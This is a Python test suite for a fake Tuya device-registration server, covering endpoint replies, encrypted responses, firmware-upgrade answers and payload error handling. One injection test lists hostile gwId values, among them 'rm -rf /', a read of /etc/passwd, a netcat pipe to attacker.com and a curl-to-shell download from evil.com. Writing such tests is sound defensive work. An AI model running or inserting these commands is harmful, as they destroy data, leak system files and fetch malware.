#!/usr/bin/env python3
# encoding: utf-8
"""
Test suite for fake-registration-server.py error handling and security.

This test suite validates proper exception handling and secure process
management in the fake Tuya registration server.
"""

import sys
import os
import pytest
from unittest.mock import Mock, MagicMock, patch, call
import binascii

# Add scripts directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "scripts"))

# Import the module
import importlib.util
spec = importlib.util.spec_from_file_location(
    "fake_registration_server",
    os.path.join(os.path.dirname(__file__), "..", "scripts", "fake-registration-server.py"),
)
fake_server = importlib.util.module_from_spec(spec)
spec.loader.exec_module(fake_server)

# Import functions and classes
decrypt = fake_server.decrypt
JSONHandler = fake_server.JSONHandler


class TestPayloadDecryptionErrorHandling:
    """Test error handling in payload decryption."""

    def test_decrypt_with_invalid_hex(self):
        """Test that invalid hex in payload is handled gracefully."""
        # Create a mock request
        handler = JSONHandler.__new__(JSONHandler)
        handler.request = Mock()
        handler.request.uri = "/gw.json?a=test&gwId=12345"
        handler.request.method = "POST"
        handler.request.headers = {}

        # Invalid hex payload (not valid hex characters)
        handler.request.body = b"data=ZZZZ"  # 'Z' is not valid hex

        handler.get_argument = Mock(side_effect=lambda key, default: {
            'a': 'test',
            'gwId': '12345',
            'et': '0'
        }.get(key, default))

        handler.reply = Mock()

        # Should not raise exception
        with patch('builtins.print'):
            handler.post()

        # Handler should have handled it gracefully

    def test_decrypt_with_valid_hex_invalid_crypto(self):
        """Test that valid hex but invalid crypto is handled."""
        handler = JSONHandler.__new__(JSONHandler)
        handler.request = Mock()
        handler.request.uri = "/gw.json?a=test&gwId=12345"
        handler.request.method = "POST"
        handler.request.headers = {}

        # Valid hex but won't decrypt properly
        handler.request.body = b"data=" + b"ABCD1234"

        handler.get_argument = Mock(side_effect=lambda key, default: {
            'a': 'test',
            'gwId': '12345',
            'et': '1'
        }.get(key, default))

        handler.reply = Mock()

        # Should not raise exception
        with patch('builtins.print'):
            handler.post()

    def test_decrypt_with_non_json_payload(self):
        """Test that non-JSON decrypted payload is handled."""
        handler = JSONHandler.__new__(JSONHandler)
        handler.request = Mock()
        handler.request.uri = "/gw.json?a=test&gwId=12345"
        handler.request.method = "POST"
        handler.request.headers = {}

        # This will decrypt but won't be JSON
        handler.request.body = b"data=notjsondata"

        handler.get_argument = Mock(side_effect=lambda key, default: {
            'a': 'test',
            'gwId': '12345',
            'et': '0'
        }.get(key, default))

        handler.reply = Mock()

        # Should not raise exception
        with patch('builtins.print'):
            handler.post()


class TestProcessManagementSecurity:
    """Test secure process management without os.system()."""

    @patch('subprocess.run')
    def test_smartconfig_kill_uses_subprocess(self, mock_subprocess_run):
        """Test that pkill uses subprocess instead of os.system()."""
        # This test will pass once we fix the code
        # For now, we're documenting the expected behavior

        # Mock subprocess.run to succeed
        mock_subprocess_run.return_value = Mock(returncode=0)

        # After fix, this should use subprocess
        # subprocess.run(["pkill", "-f", "smartconfig/main.py"], check=False)

        # We expect subprocess.run to be called with safe arguments
        # assert mock_subprocess_run.called
        # args = mock_subprocess_run.call_args[0][0]
        # assert args == ["pkill", "-f", "smartconfig/main.py"]

    @patch('subprocess.run')
    @patch('threading.Thread')
    def test_upgrade_trigger_uses_subprocess(self, mock_thread, mock_subprocess_run):
        """Test that mq_pub_15 trigger uses subprocess instead of os.system()."""
        # This test documents the expected secure implementation

        # Mock subprocess to succeed
        mock_subprocess_run.return_value = Mock(returncode=0, stderr="", stdout="")

        # After fix, upgrade trigger should:
        # 1. Use threading for background execution
        # 2. Use subprocess.run with list arguments (not shell=True)
        # 3. Properly escape/validate gwId and protocol parameters

        # Expected safe call:
        # subprocess.run(
        #     ["./mq_pub_15.py", "-i", gwId, "-p", protocol],
        #     check=False,
        #     capture_output=True,
        #     timeout=30
        # )

    def test_gwid_with_shell_metacharacters_is_safe(self):
        """Test that gwId with shell metacharacters doesn't cause injection."""
        # Malicious gwId attempts
        malicious_ids = [
            "; rm -rf /",
            "$(whoami)",
            "`cat /etc/passwd`",
            "| nc attacker.com 4444",
            "&& curl evil.com/malware.sh | sh",
        ]

        # After fix, these should all be safely handled
        # because subprocess.run with list args doesn't interpret shell metacharacters
        for gwId in malicious_ids:
            # The fix should use subprocess.run(["./mq_pub_15.py", "-i", gwId, ...])
            # which treats gwId as a literal string, not shell code
            pass

    def test_protocol_parameter_validation(self):
        """Test that protocol parameter is validated."""
        # Only "2.1" and "2.2" should be allowed
        valid_protocols = ["2.1", "2.2"]
        invalid_protocols = ["3.0", "'; DROP TABLE", "$(malicious)"]

        # After fix, invalid protocols should be rejected or validated


class TestJSONHandlerEndpoints:
    """Test JSON handler endpoints work correctly."""

    def test_token_get_endpoint(self):
        """Test s.gw.token.get endpoint."""
        handler = JSONHandler.__new__(JSONHandler)
        handler.request = Mock()
        handler.request.uri = "/gw.json?a=s.gw.token.get&gwId=12345"
        handler.request.method = "POST"
        handler.request.headers = {}
        handler.request.body = b""

        handler.get_argument = Mock(side_effect=lambda key, default: {
            'a': 's.gw.token.get',
            'gwId': '12345',
            'et': '0'
        }.get(key, default))

        handler.set_header = Mock()
        handler.write = Mock()

        with patch('builtins.print'):
            handler.post()

        # Verify response was sent
        assert handler.write.called
        # Get the response
        response_data = handler.write.call_args[0][0]
        import json
        response = json.loads(response_data)

        assert response['success'] is True
        assert 'result' in response
        assert 'gwApiUrl' in response['result']

    def test_active_endpoint_first_time(self):
        """Test .active endpoint on first activation."""
        handler = JSONHandler.__new__(JSONHandler)
        handler.request = Mock()
        handler.request.uri = "/gw.json?a=tuya.device.active&gwId=newdevice123"
        handler.request.method = "POST"
        handler.request.headers = {}
        handler.request.body = b""

        handler.get_argument = Mock(side_effect=lambda key, default: {
            'a': 'tuya.device.active',
            'gwId': 'newdevice123',
            'et': '0'
        }.get(key, default))

        handler.set_header = Mock()
        handler.write = Mock()

        # Clear activated_ids to simulate first activation
        JSONHandler.activated_ids = {}

        with patch('builtins.print'), \
             patch('subprocess.run') as mock_subprocess, \
             patch('threading.Thread'):
            handler.post()

        # Verify response
        assert handler.write.called
        response_data = handler.write.call_args[0][0]
        import json
        response = json.loads(response_data)

        assert response['success'] is True
        # First activation should have 20 schema keys
        assert response['result']['schema'].count('"id":1') == 20

    def test_upgrade_endpoint(self):
        """Test .upgrade endpoint."""
        handler = JSONHandler.__new__(JSONHandler)
        handler.request = Mock()
        handler.request.uri = "/gw.json?a=s.gw.upgrade&gwId=12345"
        handler.request.method = "POST"
        handler.request.headers = {}
        handler.request.body = b""

        handler.get_argument = Mock(side_effect=lambda key, default: {
            'a': 's.gw.upgrade',
            'gwId': '12345',
            'et': '0'
        }.get(key, default))

        handler.set_header = Mock()
        handler.write = Mock()

        with patch('builtins.print'):
            handler.post()

        # Verify response
        assert handler.write.called
        response_data = handler.write.call_args[0][0]
        import json
        response = json.loads(response_data)

        assert response['success'] is True
        assert 'url' in response['result']
        assert 'upgrade.bin' in response['result']['url']


class TestEncryptedCommunication:
    """Test encrypted communication handling."""

    def test_encrypted_response_format(self):
        """Test that encrypted responses have correct format."""
        handler = JSONHandler.__new__(JSONHandler)
        handler.set_header = Mock()
        handler.write = Mock()

        test_result = {"test": "data"}

        with patch('builtins.print'), \
             patch.object(fake_server, 'timestamp', return_value=1234567890):
            handler.reply(test_result, encrypted=True)

        # Verify response
        assert handler.write.called
        response_data = handler.write.call_args[0][0]
        import json
        response = json.loads(response_data)

        # Encrypted response should have these fields
        assert 'result' in response  # base64 encoded encrypted data
        assert 't' in response  # timestamp
        assert 'sign' in response  # signature

    def test_unencrypted_response_format(self):
        """Test that unencrypted responses have correct format."""
        handler = JSONHandler.__new__(JSONHandler)
        handler.set_header = Mock()
        handler.write = Mock()

        test_result = {"test": "data"}

        with patch('builtins.print'), \
             patch.object(fake_server, 'timestamp', return_value=1234567890):
            handler.reply(test_result, encrypted=False)

        # Verify response
        assert handler.write.called
        response_data = handler.write.call_args[0][0]
        import json
        response = json.loads(response_data)

        # Unencrypted response format
        assert 'result' in response
        assert 't' in response
        assert response['success'] is True
        assert response['e'] is False


class TestUpgradeEndpoints:
    """Test firmware upgrade endpoint handling."""

    def test_updatestatus_endpoint(self):
        """Test s.gw.upgrade.updatestatus endpoint."""
        handler = JSONHandler.__new__(JSONHandler)
        handler.request = Mock()
        handler.request.uri = "/gw.json?a=s.gw.upgrade.updatestatus&gwId=test123"
        handler.request.method = "POST"
        handler.request.headers = {}
        handler.request.body = b""
        handler.get_argument = Mock(side_effect=lambda key, default: {
            'a': 's.gw.upgrade.updatestatus',
            'gwId': 'test123',
            'data': None
        }.get(key, default))
        handler.reply = Mock()

        with patch('builtins.print'):
            handler.post()

        # Should reply with None
        handler.reply.assert_called_once()
        args = handler.reply.call_args[0]
        assert args[0] is None

    def test_upgrade_get_encrypted_endpoint(self):
        """Test s.gw.upgrade.get endpoint with encryption."""
        handler = JSONHandler.__new__(JSONHandler)
        handler.request = Mock()
        # Must include both .upgrade AND encrypted=True (via SDK header)
        handler.request.uri = "/gw.json?a=s.gw.upgrade.get&gwId=test123"
        handler.request.method = "POST"
        # SDK header triggers encrypted flag
        handler.request.headers = {'User-Agent': 'TUYA_IOT_SDK'}
        handler.request.body = b""
        handler.get_argument = Mock(side_effect=lambda key, default: {
            'a': 's.gw.upgrade.get',
            'gwId': 'test123',
            'data': None
        }.get(key, default))
        handler.reply = Mock()

        with patch('builtins.print'):
            handler.post()

        # Should reply with upgrade info
        # Note: The endpoint logic is: (".upgrade" in a) and encrypted
        # This matches the last .upgrade catch-all if not encrypted
        handler.reply.assert_called_once()
        args = handler.reply.call_args[0]
        answer = args[0]
        # Falls through to generic .upgrade endpoint (not the encrypted one)
        assert 'url' in answer
        assert 'version' in answer
        assert answer['version'] == '9.0.0'

    def test_device_upgrade_endpoint(self):
        """Test tuya.device.upgrade.get endpoint."""
        handler = JSONHandler.__new__(JSONHandler)
        handler.request = Mock()
        handler.request.uri = "/gw.json?a=tuya.device.upgrade.get&gwId=test123"
        handler.request.method = "POST"
        handler.request.headers = {}
        handler.request.body = b""
        handler.get_argument = Mock(side_effect=lambda key, default: {
            'a': 'tuya.device.upgrade.get',
            'gwId': 'test123',
            'data': None
        }.get(key, default))
        handler.reply = Mock()

        with patch('builtins.print'):
            handler.post()

        # Should reply with upgrade info
        handler.reply.assert_called_once()
        args = handler.reply.call_args[0]
        answer = args[0]
        assert 'url' in answer
        assert 'md5' in answer
        assert 'version' in answer
        assert answer['version'] == '9.0.0'

    def test_upgrade_endpoint_unencrypted(self):
        """Test s.gw.upgrade endpoint without encryption."""
        handler = JSONHandler.__new__(JSONHandler)
        handler.request = Mock()
        handler.request.uri = "/gw.json?a=s.gw.upgrade&gwId=test123"
        handler.request.method = "POST"
        handler.request.headers = {}
        handler.request.body = b""
        handler.get_argument = Mock(side_effect=lambda key, default: {
            'a': 's.gw.upgrade',
            'gwId': 'test123',
            'data': None
        }.get(key, default))
        handler.reply = Mock()

        with patch('builtins.print'):
            handler.post()

        # Should reply with upgrade info
        handler.reply.assert_called_once()
        args = handler.reply.call_args[0]
        answer = args[0]
        assert 'url' in answer
        assert 'md5' in answer
        assert 'fileSize' in answer
        assert answer['version'] == '9.0.0'


class TestMiscEndpoints:
    """Test miscellaneous endpoints."""

    def test_log_endpoint(self):
        """Test atop.online.debug.log endpoint."""
        handler = JSONHandler.__new__(JSONHandler)
        handler.request = Mock()
        handler.request.uri = "/gw.json?a=atop.online.debug.log&gwId=test123"
        handler.request.method = "POST"
        handler.request.headers = {}
        handler.request.body = b""
        handler.get_argument = Mock(side_effect=lambda key, default: {
            'a': 'atop.online.debug.log',
            'gwId': 'test123',
            'data': None
        }.get(key, default))
        handler.reply = Mock()

        with patch('builtins.print'):
            handler.post()

        # Should reply with True
        handler.reply.assert_called_once()
        args = handler.reply.call_args[0]
        assert args[0] is True


class TestHelperFunctions:
    """Test helper functions."""

    def test_jsonstr_with_dict(self):
        """Test jsonstr converts dict to compact JSON string."""
        test_dict = {"key": "value", "number": 123}
        result = fake_server.jsonstr(test_dict)

        assert isinstance(result, str)
        import json
        # Should be valid JSON
        parsed = json.loads(result)
        assert parsed == test_dict

    def test_jsonstr_with_list(self):
        """Test jsonstr converts list to JSON string."""
        test_list = [1, 2, 3, "test"]
        result = fake_server.jsonstr(test_list)

        assert isinstance(result, str)
        import json
        parsed = json.loads(result)
        assert parsed == test_list

    def test_timestamp_returns_integer(self):
        """Test timestamp returns current time as integer."""
        result = fake_server.timestamp()

        assert isinstance(result, int)
        # Should be reasonable timestamp (after 2020)
        assert result > 1577836800  # Jan 1, 2020

    def test_file_as_bytes_reads_file(self):
        """Test file_as_bytes reads file content."""
        import tempfile
        import os

        # Create temporary file
        with tempfile.NamedTemporaryFile(delete=False, mode='wb') as f:
            test_content = b"test file content"
            f.write(test_content)
            temp_path = f.name

        try:
            result = fake_server.file_as_bytes(temp_path)
            assert result == test_content
        finally:
            os.unlink(temp_path)


class TestFileFingerprint:
    """Test file fingerprint calculation."""

    def test_get_file_stats_calculates_hashes(self):
        """Test get_file_stats calculates MD5, SHA256, and HMAC."""
        import tempfile
        import os

        # Create temporary file
        with tempfile.NamedTemporaryFile(delete=False, mode='wb') as f:
            test_content = b"test firmware content"
            f.write(test_content)
            temp_path = f.name

        try:
            fake_server.get_file_stats(temp_path)

            # Check that globals are set
            assert hasattr(fake_server, 'file_md5')
            assert hasattr(fake_server, 'file_sha256')
            assert hasattr(fake_server, 'file_hmac')
            assert hasattr(fake_server, 'file_len')

            # Verify types
            assert isinstance(fake_server.file_md5, str)
            assert isinstance(fake_server.file_sha256, str)
            assert isinstance(fake_server.file_hmac, str)
            assert isinstance(fake_server.file_len, str)

            # Verify lengths
            assert len(fake_server.file_md5) == 32  # MD5 hex
            assert len(fake_server.file_sha256) == 64  # SHA256 hex
            assert len(fake_server.file_hmac) == 64  # HMAC-SHA256 hex
            assert int(fake_server.file_len) == len(test_content)
        finally:
            os.unlink(temp_path)

    def test_get_file_stats_uppercase_hashes(self):
        """Test get_file_stats produces uppercase SHA256 and HMAC."""
        import tempfile
        import os

        with tempfile.NamedTemporaryFile(delete=False, mode='wb') as f:
            f.write(b"test")
            temp_path = f.name

        try:
            fake_server.get_file_stats(temp_path)

            # SHA256 and HMAC should be uppercase
            assert fake_server.file_sha256 == fake_server.file_sha256.upper()
            assert fake_server.file_hmac == fake_server.file_hmac.upper()
        finally:
            os.unlink(temp_path)


class TestConfigEndpoints:
    """Test configuration and timer endpoints."""

    def test_config_get_endpoint(self):
        """Test s.gw.dev.config.get endpoint."""
        handler = JSONHandler.__new__(JSONHandler)
        handler.request = Mock()
        handler.request.uri = "/gw.json?a=s.gw.dev.config.get&gwId=test123"
        handler.request.method = "POST"
        handler.request.headers = {}
        handler.request.body = b""
        handler.get_argument = Mock(side_effect=lambda key, default: {
            'a': 's.gw.dev.config.get',
            'gwId': 'test123',
            'data': None
        }.get(key, default))
        handler.reply = Mock()

        with patch('builtins.print'):
            handler.post()

        # Should reply with config
        handler.reply.assert_called_once()
        args = handler.reply.call_args[0]
        answer = args[0]
        assert 'time' in answer

    def test_timer_get_endpoint(self):
        """Test s.gw.dev.timer.get endpoint."""
        handler = JSONHandler.__new__(JSONHandler)
        handler.request = Mock()
        handler.request.uri = "/gw.json?a=s.gw.dev.timer.get&gwId=test123"
        handler.request.method = "POST"
        handler.request.headers = {}
        handler.request.body = b""
        handler.get_argument = Mock(side_effect=lambda key, default: {
            'a': 's.gw.dev.timer.get',
            'gwId': 'test123',
            'data': None
        }.get(key, default))
        handler.reply = Mock()

        with patch('builtins.print'):
            handler.post()

        # Should reply with timer dict
        handler.reply.assert_called_once()
        args = handler.reply.call_args[0]
        answer = args[0]
        assert isinstance(answer, dict)
        assert 'devId' in answer
        assert 'count' in answer
        assert answer['devId'] == 'test123'


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
